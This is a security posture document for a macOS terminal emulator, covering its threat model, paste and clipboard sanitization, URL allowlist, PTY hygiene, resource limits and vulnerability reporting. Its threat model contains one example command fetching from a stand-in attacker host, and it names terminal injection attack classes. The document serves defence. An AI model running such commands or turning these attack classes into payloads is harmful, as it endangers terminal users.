# Security Posture

Blackbird is a macOS-only terminal emulator. Its attack surface is:

1. **Shell output bytes** — arbitrary input from a remote, a compromised
   process, or a user-piped file. Every byte passes through
   `alacritty_terminal`'s VT parser before touching any state.
2. **User keystrokes and paste content** — sourced from system input.
   Pasted content may be web-origin and contain hidden hostile payloads.
3. **Drag-and-drop file URLs** — paths with shell metacharacters.
4. **OSC 8 hyperlinks** — URLs encoded by the remote; opened on ⌘-click.

## Threat model

- **In scope**: a hostile remote over SSH / a compromised container /
  `curl attacker.com | cat`. An attacker with arbitrary byte-stream
  output into the PTY should not be able to execute code, leak state
  back to themselves, or poison the user's clipboard.
- **Out of scope**: attackers with local filesystem write access to
  `~/.terminfo`, attackers with code execution in the app, or users who
  *deliberately* paste and execute hostile content after seeing it.

## Mitigations (current)

### Input sanitization on paste

Every paste runs through `normalizePasteLineEndings` →
`sanitizePasteControls` → `stripBidiOverrides` →
`sanitizeBracketedPaste` before reaching the PTY. Implemented in
`Sources/Blackbird/Terminal/TerminalView.swift`. Tests in
`Tests/BlackbirdTests/TerminalViewTests.swift` (`test_sanitize*`,
`test_stripBidi*`, `test_paste*`).

- C0 controls (0x00–0x1F except TAB/LF/CR) and DEL → replaced with space.
  Blocks CVE-2026-26982 class (Ctrl+C / ESC inside paste escaping the
  bracketed-paste frame).
- C1 controls (UTF-8 `0xC2 0x80..0x9F`) → replaced with space. Closes
  the ESC-free CSI / OSC / DCS alternates that xterm's
  `allowC1Printable=off` default disables.
- Bidi formatting controls (U+061C, U+180E, U+200E/F, U+202A–E,
  U+2066–9) → removed. Blocks Trojan Source (CVE-2021-42574) class.
- `ESC [ 201 ~` bracketed-paste terminator → removed. Blocks nested
  paste-injection where pasted content would close the paste frame
  and let subsequent bytes execute as shell input.

### Output sanitization on copy / OSC 52

`copy(_:)` and OSC 52 clipboard-write both run the scrub chain before
`NSPasteboard.setString`. Prevents Blackbird from transitively
poisoning other apps' pastes with bidi / control bytes received from
a hostile remote. Same code path as inbound paste — symmetric.

### URL scheme allowlist

OSC 8 hyperlinks and regex-detected URLs are filtered through
`OSC8URLPolicy.isAllowed` before `NSWorkspace.open`. Allowlist:
`http`, `https`, `ftp`, `mailto`. Notable omissions:

- `file://` rejected — `NSWorkspace.open` on `.command` / `.app` /
  `.pkg` / `.workflow` / `.terminal` / `.scpt` executes the payload.
  Users with a legitimate local path should `open <path>` from the
  shell instead.
- `javascript:`, `data:`, `x-man-page:`, custom handlers — all
  rejected. Blocks CVE-2023-46321 (iTerm2 OSC 8 argument-injection)
  class.

### Silent reply policy for window / color queries

Blackbird never replies to:

- CSI 20t (report icon label)
- CSI 21t (report window title) — HD Moore 2003 class
- OSC 10, 11, 12 colour queries

These would echo shell-controlled bytes back to the PTY. Pinned via
tests in `core/tests/terminal_replies.rs`.

### PTY child hygiene (post-fork, pre-exec)

`PTY.spawn` in `Sources/Blackbird/Terminal/PTY.swift`:

- Scrubs launchd / XPC / CoreFoundation environment:
  `XPC_SERVICE_NAME`, `XPC_FLAGS`, `__CF_USER_TEXT_ENCODING`,
  `OS_ACTIVITY_DT_MODE`, `__XCODE_BUILT_PRODUCTS_DIR_PATHS`,
  `__XPC_DYLD_LIBRARY_PATH`, `LaunchInstanceID`, `SECURITYSESSIONID`.
- Resets signal mask to empty; reinstalls `SIG_DFL` for signals the
  shell uses for job control.
- Closes every inherited fd `[3, _SC_OPEN_MAX)` — clamped at 65 536.
- Reinstalls the bundled kitty terminfo at every launch so a planted
  `~/.terminfo/x/xterm-kitty` with hostile capabilities gets
  overwritten.

### Memory and CPU bounds

- Grid dimensions clamped `[2, 1000]` at `bb_term_new` and
  `bb_term_resize` (Rust) and mirrored in Swift
  `TerminalSession.resize`. An unclamped `UInt16.max × UInt16.max`
  request would allocate `rows × (cols + scrollback) × cell_size`
  bytes — 100+ GB, enough to lock up the host.
- OSC 8 URI capped at 4 KiB per link (Rust, `bb_term_take_snapshot`).
- Scrollback capped at 50 000 lines (Rust, `bb_term_new`) — 5× the
  default Blackbird value (10 000). Paired with the 1000-col grid
  ceiling, bounds per-terminal worst-case allocation at ~1.5 GB.
- OSC 52 payload capped at 1 MiB (Swift,
  `TerminalSession.osc52MaxBytes`).
- Copy-to-clipboard capped at 16 MiB.
- Find results capped at 10 000 matches.
- CGFloat coordinates `isFinite`-checked before any `Int(Double)`
  cast (mouse reporting, grid sizing, buffer-point conversion). A
  NaN / ±Infinity from a misbehaving input device or a stray Core
  Animation value would otherwise SIGILL the process at the cast.
- `encodeMouseReport` rejects button outside [0, 224) and negative
  coords.
- Preferences `fontSize` and `translucency` clamped at set time —
  tampered plist can't poison readers.

### macOS-specific

- Hardened runtime enabled; no `com.apple.security.cs.*-disable` or
  `-allow-unsigned-*` entitlements.
- App Sandbox intentionally **off** — a sandboxed terminal can't fork
  arbitrary shells.
- `EnableSecureEventInput()` held while the terminal window is key;
  released on resign. Prevents peer processes (keyloggers,
  TextExpander) from seeing keystrokes while a shell prompt is
  focused.
- Sparkle 2.9.1 (≥ 2.6.4 signed-feed-bypass fix); auto-start gated on
  a real SUFeedURL + SUPublicEDKey; `SUEnableInstallerLauncherService`
  off until a real release.

### Rendering

Metal shaders use `clamp_to_edge` samplers and Metal-enforced draw-
count bounds, so glyph atlas data can't produce out-of-bounds reads.
Frame-skip cache keyed on a monotonic `BBSnapshot.sequenceID` rather
than handle pointers — Swift class allocation can reuse a freed
address, which would make pointer-equality false-positive and drop a
legitimate repaint.

## CI gates

`scripts/check-security-posture.sh`:

- `ENABLE_HARDENED_RUNTIME: YES` in `project.yml`
- No runtime-downgrading entitlements anywhere in sources / build
  scripts / GitHub Actions
- No `*.entitlements` files in `Sources/`
- `release.sh` targets Developer ID + runs notarytool
- Sparkle ≥ 2.6.4 pinned in `Package.resolved`
- App Sandbox entitlement absent
- `SUFeedURL` ⇔ `SUPublicEDKey` consistency
- `SUEnableInstallerLauncherService` off (stays off by policy — the
  installer-launcher XPC service is never appropriate for a signed
  Developer-ID distribution; Sparkle installs in-place)

## Reporting

**Preferred channel — GitHub Private Security Advisories:**
https://github.com/conjfrnk/blackbird/security/advisories/new

Use this for any vulnerability report. The form creates a private thread
between the reporter and the maintainer; the report is never visible in
the public issue tracker, and a CVE can be requested from the same page
once a fix is ready.

**Coordinated-disclosure fallback:** email the maintainer via the
address on the GitHub profile at https://github.com/conjfrnk.

**Do NOT:** open a public issue or a public pull request that describes
an unpatched vulnerability. Terminal emulators commonly parse untrusted
output — an RCE report on the public tracker is a zero-day for every
user running an older build.
